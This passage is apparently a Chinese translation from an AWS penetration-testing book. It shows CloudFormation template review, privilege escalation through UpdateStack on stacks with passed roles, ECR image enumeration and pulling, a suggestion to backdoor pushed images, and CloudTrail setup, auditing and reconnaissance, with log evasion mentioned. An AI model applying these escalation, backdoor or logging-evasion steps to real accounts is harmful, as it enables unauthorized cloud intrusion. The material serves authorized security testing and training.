要使用`cfn_nag`（在撰写本文时，这可能会随着工具的更新而改变），我们将假设已安装 Ruby 2.2.x，因此我们可以使用以下命令安装`cfn_nag` gem：

```
gem install cfn-nag
```

然后，我们可以将从 AWS API 检索到的模板保存到文件中，例如`template.json`或`template.yaml`，具体取决于您的模板类型。对于我们的演示，我们将其保存到`template.json`，因此我们可以运行以下命令来扫描模板：

```
cfn_nag_scan --input-path ./template.json
```

输出应该看起来像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a11cae28-0155-45b8-a8db-b01b880f804b.png)

使用 cfn_nag 扫描我们的 CloudFormation 模板的结果

输出显示，我们扫描的模板输出了`1`个失败和`2`个警告。所有三个都与`"WebServerSecurityGroup"`及其入站/出站规则集相关联。两个警告是关于允许通过该安全组的入站规则过于宽松，但如果该安全组还定义了 SSH 入站规则，那么这两个警告出现是有道理的。这是因为我们知道允许从`0.0.0.0/0`范围访问 SSH 入站，这不是`/32` IP 范围，这意味着允许世界访问。即使有了这些信息，手动检查仍然是值得的。

`cfn_nag`报告的失败可能在找到一种妥协 EC2 实例的方法之前是无关紧要的，然后我们将开始关心设置了什么出站访问规则。鉴于`cfn_nag`没有指定规则，这意味着允许所有出站互联网访问，我们不需要担心。

扫描模板后，很可能是时候进行手动检查了。手动检查将为我们提供有关模板设置的资源的大量信息，可能会发现存储在其中的其他敏感信息。在我们喜爱的文本编辑器中打开模板后，我们可以考虑一些事情。我们应该再次检查参数，看看是否有任何硬编码的敏感默认值，但也因为我们可能可以得到有关该参数的确切描述。

正如我们之前预期的那样，查看`"SSHLocation"`参数，我们可以看到有一个描述，说明可以用于 SSH 到 EC2 实例的 IP 地址范围。我们之前的猜测是正确的，但这是确认这类事情的好方法。`"Default"`键包含`"0.0.0.0/0"`值，这意味着我们一直在查看的堆栈正在使用`"SSHLocation"`参数的默认值。也许我们可以在某些情况下在模板中找到默认密码或 IP 地址的硬编码。

接下来，我们将要检查此模板中定义的资源。在这里，有各种可能遇到的事情。其中一个例子是为创建的 EC2 实例启动脚本。我们可以阅读这些内容，寻找任何敏感信息，同时了解这个堆栈部署的环境的设置/架构。

我们用于堆栈的模板有一些设置脚本，似乎是设置了一个 MySQL 数据库和一个 PHP Web 服务器。理想情况下，我们可以访问其中一个或两个，因此我们可以滚动到之前`cfn_nag`标记的`"WebServerSecurityGroup"`，我们看到以下内容：

```
"WebServerSecurityGroup" : {
  "Type" : "AWS::EC2::SecurityGroup",
  "Properties" : {
    "GroupDescription" : "Enable HTTP access via port 80",
    "SecurityGroupIngress" : [
      {"IpProtocol" : "tcp", "FromPort" : "80", "ToPort" : "80", "CidrIp" : "0.0.0.0/0"},
      {"IpProtocol" : "tcp", "FromPort" : "22", "ToPort" : "22", "CidrIp" : { "Ref" : "SSHLocation"}}
    ]
  }
}
```

这告诉我们 Web 服务器安全组允许从任何 IP 地址（`0.0.0.0/0`）对端口`80`进行入站访问，并允许从`"SSHLocation"`参数对端口`22`进行入站访问，我们知道`"SSHLocation"`参数也设置为`0.0.0.0/0`。现在我们可以回到之前检查这个堆栈的输出值，再次获取服务器的主机名，现在我们知道端口`80`是开放的。如果我们在浏览器中导航到该 URL（[`ec2-34-221-86-204.us-west-2.compute.amazonaws.com/`](http://ec2-34-221-86-204.us-west-2.compute.amazonaws.com/)），我们将看到以下页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3613329d-d857-41a2-bf26-7bde19fd1f85.png)

由 CloudFormation 堆栈部署的 EC2 实例上托管的 Web 服务器

除了我们刚刚做的事情之外，CloudFormation 模板可以被检查以确定堆栈部署的各种资源的设置，这可以帮助我们识别资源、错误配置、硬编码的秘密等，而无需具有授予对这些实际资源访问权限的 AWS 权限。

# 通过的角色

创建 CloudFormation 堆栈时，有一个选项可以为其传递 IAM 角色进行部署过程。如果传递了角色，则将使用该角色创建堆栈，但如果没有传递角色，则 CloudFormation 将只使用当前用户的权限来部署堆栈。这打开了通过已经在创建时传递了角色的堆栈进行权限提升的可能性。

假设我们被入侵的用户具有`"cloudformation:*"`权限，但没有`"iam:PassRole"`权限。这意味着我们无法通过创建一个新的堆栈并传递给它比我们拥有的更高权限的角色来提升我们的权限（因为这需要`"iam:PassRole"`权限），但这意味着我们可以修改现有的堆栈。

要确定是否有 CloudFormation 堆栈已经传递了角色，我们可以回到`DescribeStacks`命令的输出。如果一个堆栈具有`"RoleARN"`键，并且其值是 IAM 角色的 ARN，则该堆栈已经传递了一个角色。如果该键没有显示，则在创建时该堆栈没有传递角色。我们创建的演示堆栈已经传递了一个角色。

现在，如果我们有必要的 IAM 权限，我们可以使用 IAM API 来确定传递给该堆栈的角色具有哪些权限，但如果没有，我们可以根据一些不同的事情进行推断。首先，角色的名称可能是一个小提示，比如如果它包括`"EC2FullAccessForCloudFormation"`，那么可以安全地假设该角色对 EC2 具有完全访问权限。更可靠但不一定完整的权限集可以根据堆栈部署的资源进行推断。如果某个堆栈部署了一个 EC2 实例，为其创建了安全组，创建了一个 S3 存储桶，并设置了一个 RDS 数据库，那么可以安全地假设该角色有权执行所有这些操作。在我们的情况下，这比`"cloudformation:*"`更多地访问了 AWS API，因此我们可以滥用该堆栈来进一步访问环境。

有几种方法可以检查，包括仅查看我们之前查看的原始 CloudFormation 模板，或者我们可以使用`DescribeStackResources`命令列出该堆栈创建的资源，然后从那里进行我们的访问假设。这可以通过从 AWS CLI 运行以下命令来完成：

```
aws cloudformation describe-stack-resources --stack-name Test-Lamp-Stack --region us-west-2
```

我们的演示堆栈的输出如下：

```
{
    "StackResources": [
        {
            "StackName": "Test-Lamp-Stack",
            "StackId": "arn:aws:cloudformation:us-west-2:000000000000:stack/Deleted-Test-Lamp-Stack/23801r22-906h-53a0-pao3-74yre1420836",
            "LogicalResourceId": "WebServerInstance",
            "PhysicalResourceId": "i-0caa63d9f77b06d90",
            "ResourceType": "AWS::EC2::Instance",
            "Timestamp": "2018-12-26T18:55:59.189Z",
            "ResourceStatus": "CREATE_COMPLETE",
            "DriftInformation": {
                "StackResourceDriftStatus": "NOT_CHECKED"
            }
        },
        {
            "StackName": "Test-Lamp-Stack",
            "StackId": "arn:aws:cloudformation:us-west-2:000000000000:stack/Deleted-Test-Lamp-Stack/23801r22-906h-53a0-pao3-74yre1420836",
            "LogicalResourceId": "WebServerSecurityGroup",
            "PhysicalResourceId": "Test-Lamp-Stack-WebServerSecurityGroup-RA2RW6FRBYXX",
            "ResourceType": "AWS::EC2::SecurityGroup",
            "Timestamp": "2018-12-26T18:54:39.981Z",
            "ResourceStatus": "CREATE_COMPLETE",
            "DriftInformation": {
                "StackResourceDriftStatus": "NOT_CHECKED"
            }
        }
    ]
}
```

我们可以看到这里创建了一个 EC2 实例和一个 EC2 安全组，因此我们可以假设附加到该堆栈的角色至少具有执行这两项操作的权限。然后，为了利用这些权限并提升我们自己的权限，我们可以使用`UpdateStack`命令。这允许我们更新/更改与我们正在定位的堆栈相关联的模板，从而允许我们添加/删除资源到列表中。为了在环境中造成较小的干扰，我们可以从堆栈中提取现有模板，然后只向其中添加资源，以尽可能少地造成干扰。这是因为未更改的现有资源将不会被修改，因此我们不会造成拒绝服务。

在这一点上，下一步取决于情况。如果发现某个堆栈具有 IAM 权限，可以向模板添加一些 IAM 资源，以允许您提升访问权限，或者如果发现某个堆栈具有 EC2 权限，就像我们在这里所做的那样，可以添加一堆带有您自己 SSH 密钥的 EC2 实例。如果我们继续向我们的演示堆栈添加一些 EC2 实例，可能会获得对它们用于这些资源的 VPC 内部的访问权限，然后可能会进一步授予我们对环境的更高特权访问。

执行此攻击的示例命令可能如下所示：

```
aws cloudformation update-stack --stack-name Test-Lamp-Stack --region us-west-2 --template-body file://template.json --parameters file://params.json
```

`template.json`文件将包括您更新的 CloudFormation 模板，`params.json`将包括一些指示堆栈使用所有已提供的参数而不是新参数的内容：

```
[
    {
        "ParameterKey": "KeyName",
        "UsePreviousValue": true
    },
    {
        "ParameterKey": "DBPassword",
        "UsePreviousValue": true
    },
    {
        "ParameterKey": "DBUser",
        "UsePreviousValue": true
    },
    {
        "ParameterKey": "DBRootPassword",
        "UsePreviousValue": true
    }
]
```

现在，堆栈将更新并创建您的新资源，您将成功地使用传递的角色权限在 AWS 中执行 API 操作，有效地提升了自己的权限。

# 弹性容器注册表（ECR）

ECR 被描述为一个完全托管的 Docker 容器注册表，使开发人员可以轻松存储、管理和部署 Docker 容器映像（[`aws.amazon.com/ecr/`](https://aws.amazon.com/ecr/)）。它使用的权限模型可以允许一些令人讨厌的错误配置，如果存储库没有正确设置，主要是因为按设计，ECR 存储库可以被设置为公共或与其他帐户共享。这意味着，即使我们只有少量访问权限，错误配置的存储库也可能根据其托管的 Docker 映像中存储的内容，向我们授予对环境的大量访问权限。

如果我们正在针对另一个账户中的公共仓库，那么我们需要的主要信息是仓库所在的账户 ID。有几种获取它的方法。如果您拥有您正在针对的账户的凭据，最简单的方法是使用**Simple Token Service**（**STS**）`GetCallerIdentity` API，它将为您提供一些包括您的账户 ID 在内的信息。该命令将如下所示：

```
aws sts get-caller-identity
```

这种方法的问题在于它被记录到了 CloudTrail 中，并清楚地显示您正在尝试收集有关您的用户/您所在账户的信息，这可能会引起防御者的警觉。还有其他方法，特别是基于 Rhino Security Labs 的研究，他们发布了一个脚本来枚举有关当前账户的少量信息，而不会触及 CloudTrail。这是通过某些服务披露的冗长错误消息来完成的，而这些服务尚不受 CloudTrail 支持，因此没有记录 API 调用的记录，但用户收集了一些信息，包括账户 ID（[`rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/`](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)）。

如果您正在针对您已经入侵并使用这些凭据进行这些 API 调用的账户中的仓库，则账户 ID 将无关紧要，因为在大多数情况下它将自动默认为当前账户。我们首先要做的是列出账户中的仓库。这可以通过以下命令完成（如果您正在针对不同的账户，请将账户 ID 传递给`--registry-id`参数）：

```
aws ecr describe-repositories --region us-west-2
```

这应该列出当前区域中的仓库，包括它们的 ARN、注册表 ID、名称、URL 以及创建时间。我们的示例返回了以下输出：

```
{
    "repositories": [
        {
            "repositoryArn": "arn:aws:ecr:us-west-2:000000000000:repository/example-repo",
            "registryId": "000000000000",
            "repositoryName": "example-repo",
            "repositoryUri": "000000000000.dkr.ecr.us-west-2.amazonaws.com/example-repo",
            "createdAt": 1545935093.0
       }
    ]
}
```

然后我们可以使用`ListImages`命令获取存储在该仓库中的所有镜像。对于我们之前找到的`example-repo`，它将看起来像这样：

```
aws ecr list-images --repository-name example-repo --region us-west-2
```

这个命令将给我们一个镜像列表，包括它们的摘要和镜像标签：

```
{
    "imageIds": [
        {
            "imageDigest": "sha256:afre1386e3j637213ab22f1a0551ff46t81aa3150cbh3b3a274h3d10a540r268",
            "imageTag": "latest"
        }
    ]
}
```

现在我们可以（希望）将这个镜像拉到我们的本地机器并运行它，以便我们可以看到里面有什么。我们可以通过运行以下命令来完成这个操作（再次，如果需要，请在`--registry-id`参数中指定外部账户 ID）：

```
$(aws ecr get-login --no-include-email --region us-west-2)
```

AWS 命令返回所需的 docker 命令，以便将您登录到目标注册表，并且其中的`$()`将自动执行该命令并将您登录。运行后，您应该在控制台上看到`登录成功`的打印输出。接下来，我们可以使用 Docker 来拉取镜像，现在我们已经通过仓库进行了身份验证：

```
docker pull 000000000000.dkr.ecr.us-west-2.amazonaws.com/example-repo:latest
```

现在 Docker 镜像应该被拉取，并且如果您运行`docker images`来列出 Docker 镜像，它应该是可用的。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/fb01c6a4-ae68-4a3d-ab65-c791365784b7.png)

在将其拉下来后，列出`example-repo` Docker 镜像

接下来，我们将要运行这个镜像，并在其中的 bash shell 中放置自己，这样我们就可以探索文件系统并寻找任何好东西。我们可以通过以下方式来完成这个操作：

```
docker run -it --entrypoint /bin/bash 000000000000.dkr.ecr.us-west-2.amazonaws.com/example-repo:latest
```

现在我们的 shell 应该从本地机器切换到 Docker 容器，作为 root 用户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/5ff3cb4e-29ca-4692-b0fd-11a27c8c55f9.png)

使用 Docker 运行命令进入我们正在启动的容器中的 bash shell

这是您可以使用常规渗透测试技术搜索操作系统的地方。您应该寻找诸如源代码、配置文件、日志、环境文件或任何听起来有趣的东西。

如果其中任何命令由于授权问题而失败，我们可以继续检查我们所针对的仓库相关的策略。这可以通过`GetRepositoryPolicy`命令来完成：

```
aws ecr get-repository-policy --repository-name example-repo --region us-west-2
```

如果尚未为存储库创建策略，则响应将是错误；否则，它将返回一个指定 AWS 主体可以针对存储库执行什么 ECR 命令的 JSON 策略文档。您可能会发现只有特定帐户或用户能够访问存储库，或者您可能会发现任何人都可以访问它（例如如果允许`"*"`主体）。

如果您有正确的对 ECR 的推送权限，另一个值得尝试的攻击是在现有图像中植入恶意软件，然后推送更新到存储库，这样任何使用该图像的人都将启动带有您的恶意软件运行的图像。根据目标在幕后使用的工作流程，如果操作正确，可能需要很长时间才能发现其图像中的此类后门。

如果您知道使用这些 Docker 图像部署的应用程序/服务，比如通过弹性容器服务（ECS），那么值得寻找您可能能够外部利用的容器内的漏洞，然后获得对这些服务器的访问权限。为了帮助解决这个问题，使用 Anchore Engine（[`github.com/anchore/anchore-engine`](https://github.com/anchore/anchore-engine)）、Clair（[`github.com/coreos/clair`](https://github.com/coreos/clair)）或其他许多在线可用工具对各种容器进行静态漏洞分析可能会很有用。这些扫描的结果可以帮助您识别可能能够利用的已知漏洞。

# 摘要

在攻击 AWS 环境时，重要的是要列出他们正在使用的 AWS 服务的明确清单，因为这可以让您更好地制定攻击计划。除此之外，重要的是要查看部署在所有这些服务上的配置和设置，以找到错误配置和滥用的功能，并希望将它们链接在一起以获得对环境的完全访问权限。

没有服务太小，不值得关注，因为如果您有与它们交互的权限，那么可能在每个 AWS 服务中都存在攻击向量。本章旨在展示一些对一些不太常见的 AWS 服务器的攻击（与 EC2、S3 等相比），并试图表明许多服务都有处理权限的策略文档，比如 SES 身份策略或 ECR 存储库策略。这些服务都可以通过错误配置的策略或通过自己更新来滥用。

在下一章中，我们将研究 CloudTrail，这是 AWS 的中央 API 日志记录服务。我们将看看如何安全地配置您的跟踪，并如何攻击它们作为渗透测试人员进行信息收集，并在试图保持低调时避免被记录。


# 第六部分：攻击 AWS 日志记录和安全服务

在本节中，我们将介绍 AWS 上的两个主要日志记录和安全监控服务，以及它们各自的规避方法，使它们能够保持低调。本节还将涵盖这些服务的安全配置。

本节将涵盖以下章节：

+   第十五章，*Pentesting CloudTrail*

+   第十六章，*GuardDuty*


# 第十五章：渗透测试 CloudTrail

AWS CloudTrail 被描述为一项 AWS 服务，可帮助您启用 AWS 账户的治理、合规性、运营和风险审计（[`docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html`](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html)），基本上被宣传为 AWS 账户中 API 活动的中央日志来源。CloudTrail 在某种意义上是一项始终开启的服务，因为它会将读/写 API 操作记录到最近 90 天的日志的不可变存档中，称为 CloudTrail 事件历史。我们将在本章的*侦察*部分更深入地了解事件历史。

在本章中，我们将研究 CloudTrail 及其为勤勉的 AWS 用户提供的功能。我们还将从渗透测试人员的角度来看待它，涵盖如何审计目标账户中的 CloudTrail 最佳实践，以及如何通过 CloudTrail 对环境进行侦察，如何绕过 CloudTrail 服务以避开监视，以及如何破坏已经存在的任何日志记录机制。这些主题对我们的客户很有益，因为它们可以帮助他们了解环境中的盲点；然而，它们也可以帮助我们发现更多关于攻击目标的信息，而不一定需要直接对他们使用的每个服务进行 API 调用。

在本章中，我们将涵盖以下主题：

+   设置、最佳实践和审计

+   侦察

+   绕过日志记录

+   破坏跟踪

# 关于 CloudTrail 的更多信息

尽管 CloudTrail 旨在成为 AWS 账户的中央日志来源，但它的构建方式使一些不良风险暴露在新的 AWS 服务开发中。AWS 的团队正在创建一个新服务，必须创建与他们的服务集成的 CloudTrail，以允许其 API 调用记录到 CloudTrail。此外，由于 AWS 推出新服务和功能的速度很快，有许多服务发布时没有任何对 CloudTrail 的支持。可以在这里找到该列表：[`docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html`](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)。在本章后面，我们将深入探讨滥用不受支持的服务对我们作为攻击者的优势，因为任何不记录到 CloudTrail 的 API 调用对我们作为攻击者来说都是有利的。

CloudTrail 并不是 AWS 账户中日志记录的唯一选项。它汇总了大多数 AWS 服务的日志，但一些服务也提供了它们自己特定类型的日志记录。这些类型的日志包括 S3 存储桶访问日志、弹性负载均衡器访问日志、CloudWatch 日志、VPC 流量日志等。这些其他类型的日志存在是因为它们不像 CloudTrail 那样记录 API 活动，而是记录其他类型的活动，这些活动可能会有用。

在开始 CloudTrail 渗透测试之前，我们将看看如何设置它。

# 设置、最佳实践和审计

在这一部分，我们将介绍如何设置一个新的 CloudTrail 跟踪，遵循所有推荐的最有效/安全设置的最佳实践。我们将展示使用 AWS Web 控制台的设置步骤，但我们所做的一切也可以通过 AWS CLI 实现，我们将通过 CLI 审计 CloudTrail。

# 设置

让我们开始设置 CloudTrail，按照以下步骤进行：

1.  我们要做的第一件事是导航到 AWS Web 控制台中的 CloudTrail 服务，并在主页面上单击“创建跟踪”按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/53723408-3f16-4c43-8543-57f5ba0b8904.png)

图 1：在 CloudTrail 服务页面上找到“创建跟踪”按钮的位置

1.  我们将命名我们的跟踪为`ExampleTrail`，然后页面上呈现给我们的下一个选项是我们将要查看的第一个最佳实践。该选项询问我们是否想要将此跟踪应用于所有区域，最佳实践建议我们选择是，将我的跟踪应用于所有区域。这是因为 CloudTrail 可以基于每个区域运行，所以理论上您需要为每个现有的区域创建一个跟踪。有了这个选项，我们可以创建一个单一的跟踪，监视每个区域的 API 活动，因此我们将始终了解我们的环境，无论活动发生在哪里。

1.  接下来是“管理事件”部分，我们将选择“全部”。在 AWS 中有两种类型的事件：管理事件和数据事件，其中管理事件基本上是在与 AWS 交互时使用的高级 API，而数据事件可以被视为与 AWS 账户内资源进行交互。数据事件的一个示例是`s3:GetObject`事件，这将是有人访问 S3 中的对象。我们希望确保所有 API 活动都被记录下来，因此应该选择“全部”来记录管理事件。

1.  之后，我们现在处于“数据事件”部分。记录数据事件会增加一些成本，因此记录所有读取和写入数据活动可能并不总是正确的决定。此外，如果您只使用单个帐户进行跟踪，并使用一个 S3 存储桶来存储日志，那么通过记录所有 S3 数据事件，实质上您将记录 CloudTrail 正在将日志写入其日志存储桶。因此，出于这个原因，我们将在数据事件下添加一个单独的 S3 存储桶，这将是我们在上一章中创建的`bucket-for-lambda-pentesting`。在数据事件部分的 Lambda 选项卡下，我们将启用“记录所有当前和未来的调用”，以便我们可以监视所有 Lambda 函数的调用活动：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/001dfc21-54b9-4d46-b5a0-2216456f278a.png)

图 2：我们新跟踪的当前配置

1.  在存储位置部分，我们将选择“是”以创建一个新的 S3 存储桶，因为我们还没有设置存储日志的存储桶。我们将把它命名为`example-for-cloudtrail-logs`，然后我们将点击“高级”链接，以展开更多我们想要启用的选项。

1.  日志文件前缀可以填写或留空，因为这只是为了将一些内容添加到 CloudTrail 日志的路径中，以便更容易识别/分离，如果您有多种类型的日志写入到单个存储桶中。

1.  我们将选择“是”以使用 SSE-KMS 加密日志文件。

1.  我们还没有设置 KMS 密钥，因此我们也将选择“是”或“创建新的 KMS 密钥”，并将其命名为`CloudTrail-Encryption-Key`。这将确保我们所有的 CloudTrail 日志文件在存储在 S3 中时都被加密，如果需要，它还为我们提供了管理权限的能力，以确定谁可以/不能解密这些日志文件，以获得更精细的权限模型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/32503746-96cb-40e5-83bc-047e3629c393.png)

图 3：我们新跟踪的其余配置

1.  接下来，我们将选择“是”以启用日志文件验证，这告诉 CloudTrail 在日志旁边也写入摘要文件到 S3 存储桶中，然后可以用来确定自 CloudTrail 将其交付到 S3 存储桶以来，我们的日志文件是否被篡改。这对于确保我们在账户中有一个可信赖的、完整的 API 活动记录非常重要。

1.  对于最后一个选项“为每个日志文件交付发送 SNS 通知”，我们暂时选择“否”。CloudTrail 日志经常被写入，这可能会导致发送许多 SNS 通知，因此如果您对这些通知感兴趣，最好采取一种策略性的方法来解决这个问题。

1.  现在我们可以完成并点击右下角的“创建”来创建我们的新跟踪。

现在迹象将被创建和启用，此时它将立即开始发送日志文件和摘要到您的 S3 存储桶，以便读取、验证、导出等。

出于组织原因，您可能需要创建多个迹象，例如一个记录管理事件，一个记录数据事件。通常建议将这些日志发送到另一个账户，因为这样它们将与账户分开，在发生妥协时它们可能会更安全。

# 审计

现在我们已经完成了设置新的 CloudTrail 迹象的过程，我们可以离开 AWS Web 控制台，转到 AWS CLI，我们将现在介绍如何审计 CloudTrail 以确保遵循所有最佳实践。

首先，我们将要查看目标账户中是否有任何活动的迹象。我们可以使用 CloudTrail 的`DescribeTrails` API 来实现这一点，该 API 允许我们查看所有 AWS 区域中的迹象，即使它们是由账户的组织管理的。命令将看起来像这样：

```
 aws cloudtrail describe-trails --include-shadow-trails 
```

`--include-shadow-trails`标志允许我们查看其他区域/我们组织的迹象。不会显示的唯一迹象是针对命令运行的区域之外的特定区域迹象，因此可能存在一些 CloudTrail 日志记录，您只需要找到它。这仍然是一个不好的设置，因为这些日志没有扩展到每个区域。该命令的输出将给我们大部分我们感兴趣的信息。

我们希望确保 CloudTrail 日志记录扩展到所有区域，我们可以通过查看我们正在查看的特定迹象的`IsMultiRegionalTrail`键来确定。它应该设置为 true。如果没有，那么这是需要纠正的事情。一个多区域迹象比每个区域一个迹象更有意义，原因有很多，尤其是因为随着新的 AWS 区域的发布，您需要为它们创建迹象，而多区域迹象将在添加它们时自动覆盖它们。

然后我们要确保`IncludeGlobalServiceEvents`设置为`true`，因为这样可以使迹象记录非特定区域的 AWS 服务的 API 活动，例如全局的 IAM。如果禁用了这个设置，我们将错过很多重要的活动。之后，我们要确保`LogFileValidationEnabled`设置为`true`，以便可以检测和验证日志的删除和修改。然后我们将寻找`KmsKeyId`键，如果存在，将是用于加密日志文件的 KMS 密钥的 ARN，如果不存在，则意味着日志文件没有使用 SSE-KMS 进行加密。如果尚未存在，这是另一个应该添加的设置。

如果我们想确定数据事件是否已启用，我们可以首先通过查看`HasCustomEventSelectors`键来确认它是否设置为`true`。如果是`true`，我们将想要调用在创建迹象的区域中调用`GetEventSelectors` API 来查看已指定了什么。我们创建的`ExampleTrail`是在`us-east-1`区域创建的，因此我们将运行以下命令来查看事件选择器：

```
aws cloudtrail get-event-selectors --trail-name ExampleTrail --region us-east-1 
```

该 API 调用返回了以下数据：

```
{
    "TrailARN": "arn:aws:cloudtrail:us-east-1:000000000000:trail/ExampleTrail",
    "EventSelectors": [
        {
            "ReadWriteType": "All",
            "IncludeManagementEvents": true,
            "DataResources": [
                {
                    "Type": "AWS::S3::Object",
                    "Values": [
                        "arn:aws:s3:::bucket-for-lambda-pentesting/"
                    ]
                },
                {
                    "Type": "AWS::Lambda::Function",
                    "Values": [
                        "arn:aws:lambda"
                    ]
                }
            ]
        }
    ]
}
```

不同事件选择器的值告诉我们这条迹象记录了哪些类型的事件。我们可以看到`ReadWriteType`设置为`All`，这意味着我们记录了读和写事件，而不仅仅是其中的一个。我们还可以看到`IncludeManagementEvents`设置为`true`，这意味着迹象正在记录我们想要的管理事件。在`DataResources`下，我们可以看到 S3 对象日志记录已启用，ARN 为`arn:aws:s3:::bucket-for-lambda-pentesting/`，但没有其他的，并且 Lambda 函数调用日志已启用，ARN 中包含`arn:aws:lambda`的函数，这意味着所有 Lambda 函数。

理想情况下，读写事件应该被记录，管理事件应该被记录，所有 S3 存储桶/ Lambda 函数应该被记录，但这可能并不总是可能的。

现在我们已经检查了跟踪的配置，我们需要确保它已启用并记录日志！我们可以使用与跟踪创建在同一区域的`GetTrailStatus` API 来实现这一点：

```
aws cloudtrail get-trail-status --name ExampleTrail --region us-east-1 
```

它将返回以下类似的输出：

```
{
    "IsLogging": true,
    "LatestDeliveryTime": 1546030831.039,
    "StartLoggingTime": 1546027671.808,
    "LatestDigestDeliveryTime": 1546030996.935,
    "LatestDeliveryAttemptTime": "2018-12-28T21:00:31Z",
    "LatestNotificationAttemptTime": "",
    "LatestNotificationAttemptSucceeded": "",
    "LatestDeliveryAttemptSucceeded": "2018-12-28T21:00:31Z",
    "TimeLoggingStarted": "2018-12-28T20:07:51Z",
    "TimeLoggingStopped": ""
}
```

最重要的事情是查看`IsLogging`键是否设置为`true`。如果设置为`false`，那么意味着该跟踪已被禁用，我们刚刚检查的所有配置都无关紧要，因为它实际上并没有记录任何内容。

此外，我们可以查看`LatestDeliveryAttemptTime`和`LatestDeliveryAttemptSucceeded`键，以确保日志被正确传送。如果日志被传送，那么这两个值应该是相同的。如果不是，那么就有一些问题阻止了 CloudTrail 将这些日志传送到 S3。

这基本上总结了 CloudTrail 设置和最佳实践的基础知识，但是通过为跟踪使用 KMS 加密密钥创建自定义策略，并修改 S3 存储桶策略以进一步限制对日志的访问、防止日志被删除等，可以更深入和安全地进行设置。

# 侦察

现在我们将转变方向，讨论 CloudTrail 如何帮助我们作为攻击者。它可以帮助我们进行侦察和信息收集。

您可能无法总是妥协于具有必要的 S3 读取权限并具有使用最初使用的 KMS 密钥加密数据的访问权限的用户。如果您没有这两个权限，那么您将无法读取日志文件。甚至可能存在其他限制，使您难以做到这一点。为了解决这个问题，我们可以使用我们的`cloudtrail:LookupEvents`权限与 CloudTrail 事件历史记录进行交互。CloudTrail 事件历史记录是通过 CloudTrail API 提供的一个始终可用的、不可变的读/写管理事件记录。这些日志可以通过使用`LookupEvents` API 或访问 AWS Web 控制台中的事件历史记录页面来获取：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f1fc9b2c-1d15-4ec4-bf04-9374ebd25f70.png)

图 4：在 AWS Web 控制台中查找 CloudTrail 事件历史记录的位置

由于 CloudTrail 事件历史记录是不可变的，并且与 S3 分开，因此它对于防御者和攻击者都是一个有用的工具。作为防御者，如果发生了什么事情，您的 CloudTrail 日志被修改或删除，您可以恢复它们，CloudTrail 事件历史记录可能是一个有用的地方，以找出在那段时间内发生了什么（如果是在过去 90 天内）。作为攻击者，我们可以使用它来收集有关目标环境的信息，而无需访问 S3 或 KMS。

由于事件历史记录中存储的日志数量以及下载这些日志所需的极其缓慢的 API 调用，要在没有某种过滤器的情况下审查大量信息可能会很困难。由于这可能归因于您应该使用真实的跟踪而不仅仅是事件历史记录，CloudTrail `LookupEvents` API 一次只返回 50 个事件，并且速率限制为每秒一次。在大型环境中，这意味着即使只是过去一天的所有日志，下载所有日志可能需要大量时间。这给我们留下了两个选择：一个是等待下载并尽可能多地获取，但由于可能涉及的大量时间，这并不推荐。第二个选择是在下载之前检查和过滤日志，这样就会减少等待的日志数量。

通过查看事件历史中的不同事件，我们可以收集大量信息。在大规模上，我们可以确定哪些用户/服务是活跃的，以及他们进行了什么样的活动，我们可以了解他们在 AWS 中的习惯。这对我们有帮助，因为我们可以在攻击中使用这些知识。这样，我们可以通过不做任何可能在账户中不寻常的事情来保持低调。通过 AWS Web 控制台，我们已经选择了在本章前面设置 trail 时生成的 CloudTrail `CreateTrail`事件。Web 控制台将信息聚合成一个易于查看的格式，但我们可以点击“查看事件”按钮来查看请求的原始 JSON。该 JSON 看起来像下面这样：

```
{
    "eventVersion": "1.06",
    "userIdentity": {
        "type": "IAMUser",
        "principalId": "AIDARACQ1TW2RMLLAQFTX",
        "arn": "arn:aws:iam::000000000000:user/TestUser",
        "accountId": "000000000000",
        "accessKeyId": "ASIAQA94XB3P0PRUSFZ2",
        "userName": "TestUser",
        "sessionContext": {
            "attributes": {
                "creationDate": "2018-12-28T18:49:59Z",
                "mfaAuthenticated": "true"
            }
        },
        "invokedBy": "signin.amazonaws.com"
    },
    "eventTime": "2018-12-28T20:07:51Z",
    "eventSource": "cloudtrail.amazonaws.com",
    "eventName": "CreateTrail",
    "awsRegion": "us-east-1",
    "sourceIPAddress": "1.1.1.1",
    "userAgent": "signin.amazonaws.com",
    "requestParameters": {
        "name": "ExampleTrail",
        "s3BucketName": "example-for-cloudtrail-logs",
        "s3KeyPrefix": "",
        "includeGlobalServiceEvents": true,
        "isMultiRegionTrail": true,
        "enableLogFileValidation": true,
        "kmsKeyId": "arn:aws:kms:us-east-1:000000000000:key/4a9238p0-r4j7-103i-44hv-l457396t3s9t",
        "isOrganizationTrail": false
    },
    "responseElements": {
        "name": "ExampleTrail",
        "s3BucketName": "example-for-cloudtrail-logs",
        "s3KeyPrefix": "",
        "includeGlobalServiceEvents": true,
        "isMultiRegionTrail": true,
        "trailARN": "arn:aws:cloudtrail:us-east-1:000000000000:trail/ExampleTrail",
        "logFileValidationEnabled": true,
        "kmsKeyId": "arn:aws:kms:us-east-1:000000000000:key/4a9238p0-r4j7-103i-44hv-l457396t3s9t",
        "isOrganizationTrail": false
    },
    "requestID": "a27t225a-4598-0031-3829-e5h130432279",
    "eventID": "173ii438-1g59-2815-ei8j-w24091jk3p88",
    "readOnly": false,
    "eventType": "AwsApiCall",
    "managementEvent": true,
